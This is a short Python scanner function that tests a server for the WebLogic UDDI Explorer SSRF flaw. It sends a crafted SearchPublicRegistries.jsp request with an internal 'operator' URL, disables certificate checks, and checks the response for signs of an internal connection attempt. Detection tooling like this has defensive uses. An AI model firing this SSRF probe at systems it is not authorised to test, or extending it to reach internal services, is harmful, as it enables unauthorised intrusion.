import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700"
	headers={'Cookie': 'publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|;'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and ("&#39;127.1.1.1&#39;, port: &#39;700&#39;" in response.text or "Socket Closed" in response.text):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
